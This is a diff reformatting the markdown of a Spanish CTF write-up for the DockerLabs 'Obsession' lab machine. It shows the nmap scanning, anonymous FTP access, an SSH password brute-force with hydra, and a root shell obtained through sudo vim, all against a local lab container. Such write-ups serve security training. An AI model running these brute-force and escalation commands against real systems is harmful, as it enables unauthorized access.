@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Obsession
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Obsession ​​
+
+## 🖥️ Writeup - Obsession
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Hydra` `Anonymous FTP` `Information Leakage` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip obsession.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh obsession.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p21,22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 16:11 CEST
 Nmap scan report for 172.17.0.2
@@ -95,7 +104,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
 ```
 
-Vemos que el `login` anónimo por el puerto `21` (`FTP`) está habilitado, así que vamos a explorar su contenido. 
+Vemos que el `login` anónimo por el puerto `21` (`FTP`) está habilitado, así que vamos a explorar su contenido.
 
 ```bash
 ftp 172.17.0.2
@@ -107,7 +116,7 @@ Dentro encontramos dos archivos `.txt`, los transferimos a nuestra máquina atac
 
 Uno de los archivos es un registro de chats entre dos personas: `gonza` y `russoski`, que podrían ser usuarios del sistema.
 
-Accedemos al puerto `80` y comprobamos que hay una página web montada por `russoski`. 
+Accedemos al puerto `80` y comprobamos que hay una página web montada por `russoski`.
 
 Además, en el código fuente encontramos el siguiente comentario:
 
@@ -122,6 +131,7 @@ hydra -l russoski -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 60
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -141,15 +151,16 @@ Nos conectamos por `SSH`.
 ssh russoski@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for russoski on eb38cc248594:
     env_reset, mail_badpass,
@@ -166,6 +177,7 @@ sudo vim -c ':!/bin/sh'
 ```
 
 Info:
+
 ```
 # whoami
 root
